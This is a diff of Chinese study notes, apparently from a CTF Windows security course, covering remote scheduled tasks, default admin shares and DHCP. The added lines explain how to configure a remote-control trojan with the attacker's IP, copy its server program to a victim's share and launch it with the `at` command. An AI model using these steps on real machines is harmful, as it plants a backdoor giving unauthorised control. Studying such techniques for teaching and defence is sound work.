@@ -114,7 +114,7 @@ c. 删除远程共享文件夹中的内容
 
  
 
-## 8. 使用at命令 让服务器段启动订时计划
+## 8. 使用at命令 让服务器段启动定时计划
 
 在客户端使用 `net time \\192.168.1.1` 确定服务器端的时间
 
@@ -126,7 +126,7 @@ at `\\192.168.1.1 15:09 d:\123.bat`  让服务器自动在15:09执行`123.bat`
 
  
 
-那个啥的使用方法
+## 那个啥的使用方法（HUIGEZI）
 
 使用工具时首先配置服务程序，在弹出的界面中填写攻击者的IP地址
 
@@ -135,30 +135,38 @@ at `\\192.168.1.1 15:09 d:\123.bat`  让服务器自动在15:09执行`123.bat`
 
 使用工具时将生成的服务程序通过文件共享服务传给服务器端，再通过at命令定时启动
 
+>开启远程共享服务的情况下
+
+在攻击者自己的电脑上cmd `copy 生成的服务程序所在路径 \\被攻击者ip地址$ ` 
+
+例如：`copy d:\123.exe \\192.168.1.1$` 在目标主机的c盘根目录就会出现这个文件
+
+再在攻击方cmd设置开启时间 `net time \\192.168.1.1` 然后 `at \\192.168.1.1 触发时间 c:\123.exe`
+
 ![img](https://github.com/AlphaXiao/CTF-Windows-Security/blob/main/Days/pictures/%E5%9B%BE%E7%89%87211.png) 
  
 
 ## 9. 默认共享的取消
 
-a. 使用`net shar` 删除已经共享的文件夹
+a. 使用`net share` 删除已经共享的文件夹
 
   - 例如 `net  share  c$  /del`
 
  
 
-b. 在运行中通过services.msc命令打开服务管理界面，之后如下图操作
+b. 在运行中通过`services.msc`命令打开服务管理界面，之后如下图操作
 
 ![img](https://github.com/AlphaXiao/CTF-Windows-Security/blob/main/Days/pictures/%E5%9B%BE%E7%89%87212.png) 
 
  
 
-C. 通过批处理文件，将`c$ d$....admin$`全部关闭，之后将批处理文件放入开机启动当中
+C. 通过批处理文件（写一个含有命令的.bat文件）将`c$ d$....admin$`全部关闭，之后将批处理文件放入开机启动当中
 
  
 
  
 
-DHCP服务（Dynamic Host Configuration Protocol）
+## DHCP服务（Dynamic Host Configuration Protocol）
 
 自动为客户机分配IP地址的服务
 
